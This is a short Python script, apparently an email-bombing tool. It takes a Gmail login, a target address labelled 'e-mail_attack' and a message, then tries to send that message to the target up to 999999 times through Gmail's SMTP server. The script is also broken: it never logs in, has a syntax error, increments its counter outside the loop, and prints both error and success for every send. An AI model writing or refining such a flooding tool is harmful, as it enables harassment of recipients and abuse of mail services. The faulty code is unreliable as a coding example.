import smtplib
smtpObj = smtplib.SMTP('smtp.gmail.com',587)
smtpObj.starttls()
gml = input("gmail:")
ps = input("password:")
jar = input("e-mail_attack:")
mess = input("message:")
smtpObj.sendmail(gml,jar,mess)
i = 1
while i <= 999999:
 smtpObj.sendmail(gml,jar,mess):
 print('message send - [ERROR]')
 print('message send - [OK]')
i = i + 1
